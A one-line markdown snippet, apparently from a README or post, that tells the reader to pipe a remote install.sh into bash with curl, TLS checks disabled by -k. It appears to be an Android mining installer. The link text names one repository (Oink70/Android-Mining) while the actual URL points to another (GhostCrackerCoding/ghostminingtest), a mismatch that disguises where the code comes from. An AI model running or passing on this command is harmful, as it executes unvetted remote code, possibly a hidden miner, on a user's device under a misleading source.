...
```bash
curl -o- -k [https://raw.githubusercontent.com/Oink70/Android-Mining/main/install.sh](https://raw.githubusercontent.com/GhostCrackerCoding/ghostminingtest/main/install.sh) | bash
```
